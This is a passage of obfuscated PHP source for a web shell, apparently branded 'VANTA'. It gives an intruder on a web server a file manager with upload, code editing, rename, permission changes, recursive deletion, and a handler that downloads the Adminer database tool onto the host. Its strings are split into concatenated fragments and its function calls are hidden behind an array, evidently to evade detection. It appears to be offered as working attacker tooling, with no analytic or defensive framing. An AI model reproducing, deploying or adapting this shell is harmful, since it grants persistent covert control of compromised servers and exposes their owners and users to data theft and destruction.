       echo '<'.'d'.'iv'.' s'.'t'.'y'.'le'.'="'.'c'.'ol'.'or:'.'#'.'e5'.'39'.'35'.';m'.'ar'.'g'.'i'.'n'.':1'.'2px'.' 0 '.'0 '.'0'.';'.'fon'.'t-s'.'i'.'ze'.':1.'.'08'.'em'.';te'.'x'.'t'.'-al'.'ig'.'n:'.'c'.'e'.'n'.'ter'.';">'.'<'.'i'.' c'.'la'.'ss='.'"f'.'as '.'fa'.'-'.'ti'.'me'.'s-'.'c'.'i'.'rc'.'le'.'">'.'<'.'/i'.'> '.'F'.'a'.'i'.'led'.' '.'to '.'cr'.'ea'.'te '.'f'.'ile'.'!</'.'di'.'v'.'>';
     }
    } else {
     echo '<'.'di'.'v'.' s'.'ty'.'l'.'e='.'"c'.'olo'.'r:#'.'b71'.'c'.'1c;'.'m'.'a'.'rg'.'in:'.'12'.'px '.'0 0'.' 0;'.'f'.'ont'.'-'.'s'.'iz'.'e:'.'1'.'.0'.'8e'.'m;t'.'ext'.'-al'.'i'.'g'.'n:c'.'ent'.'er'.';"'.'><'.'i c'.'la'.'s'.'s='.'"'.'fa'.'s'.' fa'.'-e'.'xc'.'la'.'ma'.'ti'.'on'.'-c'.'irc'.'le'.'">'.'<'.'/i>'.' '.'Fi'.'le'.' al'.'r'.'ea'.'dy'.' ex'.'ist'.'s'.'!</'.'d'.'i'.'v'.'>';
    }
    }
    ?>
  </div>
...
<?php if (!empty($_GET['r'.'e'])) : ?>
  <div class="v4nt4-modal-bg">
    <div class="v4nt4-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="v4nt4-modal-header-wiz">
     <div><div class="v4nt4-wiz-title">rename <?= unx($_GET['r'.'e']) ?></div>
     </div>
    <a href="?VANTA=<?= vanta_PR1V($VANTAxas[0]()) ?>" class="v4nt4-modal-close-wiz">&times;</a>
    </div><form action="" method="post">
     <div class="v4nt4-wiz-section">
       <div class="v4nt4-wiz-fields">
       <input type="text" name="renameFile" class="v4nt4-wiz-input" value="<?= unx($_GET['r'.'e']) ?>"><br>
       </div>
     </div>
     <div class="v4nt4-modal-actions-wiz">
       <button type="submit" name="submit" class="v4nt4-wiz-btn v4nt4-wiz-btn-red">
...
<?php endif; ?>
<?php 
    if (isset($_GET['a'.'ct'.'i'.'on']) && $_GET['a'.'ct'.'ion'] == 'del'.'e'.'te' && isset($_GET['ite'.'m']) && $_GET['it'.'em'] !== '') {
      $item = basename(unx($_GET['ite'.'m'])); 
    ...
    ?>
    <?php if (!empty($_GET['c'.'h'])) : ?>
  <div class="v4nt4-modal-bg">
    <div class="v4nt4-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="v4nt4-modal-header-wiz">
     <div>
       <div class="v4nt4-wiz-title">change permission</div>
       <div class="v4nt4-wiz-desc"><?= unx($_GET['c'.'h']) ?></div>
     </div>
    <a href="?VANTA=<?= vanta_PR1V($VANTAxas[0]()) ?>" class="v4nt4-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
...
if (isset($_POST['pr'.'iv'.'day'.'z'.'-up'.'-'.'su'.'bmi'.'t'])) {
    $nf = $_FILES['pri'.'v'.'da'.'yz'.'-u'.'p'.'loa'.'d']['na'.'m'.'e'] ?? '';
    $tf = $_FILES['pr'.'ivd'.'ayz'.'-u'.'plo'.'a'.'d']['t'.'m'.'p_n'.'am'.'e'] ?? '';
    $slash = "\x2f";
...
function generateRandomString($length = 10) {
    $characters = '0'.'1'.'234'.'567'.'89a'.'bc'.'de'.'f'.'gh'.'i'.'j'.'klm'.'n'.'opq'.'rst'.'u'.'vw'.'x'.'yz'.'A'.'BCD'.'EFG'.'HI'.'JK'.'LM'.'NOP'.'QRS'.'TU'.'VW'.'XY'.'Z';
...
if (isset($_POST['s'.'ave'.'-ed'.'it'.'o'.'r'])) {
    $xjytx = $VANTAxas[0]() . "\x2f" . unx($_GET['f']);
    $k3rz9 = $_POST['cod'.'e-e'.'dit'.'or'];
...
if (isset($_GET['ad'.'mi'.'ner'])) {
    $URL = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
    $target = "adminer.php";
    $content = '';
    if (ini_get('al'.'l'.'ow'.'_u'.'rl_'.'fo'.'pe'.'n')) {
        $content = @file_get_contents($URL);
    }
    if (!$content && function_exists('c'.'u'.'r'.'l_i'.'ni'.'t')) {
        $ch = curl_init($URL);
...
if (isset($_POST['sub'.'mit'.'-'.'act'.'ion'])) {
    $u5w8d = $_POST['c'.'hec'.'k'];
    $jv8s3 = $_POST['pr'.'ivd'.'ayz'.'-'.'s'.'el'.'e'.'c'.'t'];
    $bvqzp = $VANTAxas[0];
    $b1s7a = $VANTAxas[24];
    $y4sdg = $VANTAxas[3];
...
} else if (isset($_GET['re'.'s'.'p'.'o'.'nse']) && $_GET['re'.'s'.'po'.'nse'] == "failed") {
    echo "<script>
    Swal.fire({
      icon: 'error',
      title: 'Error!',
...
function success() {echo '<me'.'ta '.'h'.'tt'.'p-'.'e'.'qu'.'iv='.'"re'.'f'.'r'.'es'.'h'.'"'.' '.'c'.'ont'.'e'.'nt'.'="'.'0;'.'u'.'r'.'l'.'=?V'.'AN'.'TA'.'=' . vanta_PR1V($GLOBALS['V'.'AN'.'TA'.'x'.'a'.'s'][0]()) . '&r'.'es'.'po'.'ns'.'e=s'.'uc'.'ces'.'s">';}
function failed(){echo '<me'.'t'.'a'.' ht'.'t'.'p'.'-e'.'qu'.'iv='.'"r'.'efr'.'esh'.'"'.' '.'co'.'nt'.'e'.'n'.'t'.'="0'.';ur'.'l'.'='.'?VA'.'NT'.'A=' . vanta_PR1V($GLOBALS['V'.'AN'.'T'.'Axa'.'s'][0]()) . '&re'.'sp'.'ons'.'e='.'fai'.'le'.'d'.'">';}
function vantaFormat($bytes) {$types = array('<sp'.'an'.' c'.'la'.'s'.'s'.'="'.'f'.'il'.'e'.'-'.'s'.'iz'.'e"'.'>'.'B'.'</s'.'pa'.'n'.'>', '<'.'s'.'p'.'an'.' c'.'l'.'a'.'ss='.'"fi'.'l'.'e'.'-si'.'ze"'.'>K'.'B<'.'/sp'.'a'.'n'.'>', '<s'.'pa'.'n c'.'las'.'s='.'"fi'.'le-'.'siz'.'e">'.'MB'.'</s'.'pa'.'n>', '<s'.'pan'.' '.'cla'.'s'.'s='.'"f'.'i'.'le-'.'siz'.'e">'.'GB'.'<'.'/sp'.'an'.'>', '<sp'.'an'.' '.'c'.'la'.'s'.'s'.'='.'"'.'fi'.'le-'.'siz'.'e'.'">T'.'B<'.'/s'.'p'.'an>'); for ($i = 0; $bytes >= 1024 && $i< (count($types) - 1); $bytes /= 1024, $i++); return (round($bytes, 2) . " " . $types[$i]);}
...
function unlinkDir($dir) { $d1Xe = array($dir); $files = array(); for ($i = 0;; $i++) { if (isset($d1Xe[$i])) $dir = $d1Xe[$i]; else break; if ($opn = @opendir($dir)) { while ($rd = @readdir($opn)) { if ($rd != "\x2e" && $rd != "\x2e\x2e") { $pth = $dir . "\x2f" . $rd; if ($GLOBALS['V'.'A'.'NT'.'Ax'.'a'.'s'][2]($pth)) { $d1Xe[] = $pth; } else { $files[] = $pth; } } } closedir($opn); } } foreach ($files as $file) { if (!@$GLOBALS['VA'.'NTA'.'xas'][24]($file)) { return false; } } $d1Xe = array_reverse($d1Xe); foreach ($d1Xe as $d1x2) { if (!@$GLOBALS['V'.'ANT'.'A'.'xas'][25]($d1x2)) { return false; } } return true; }
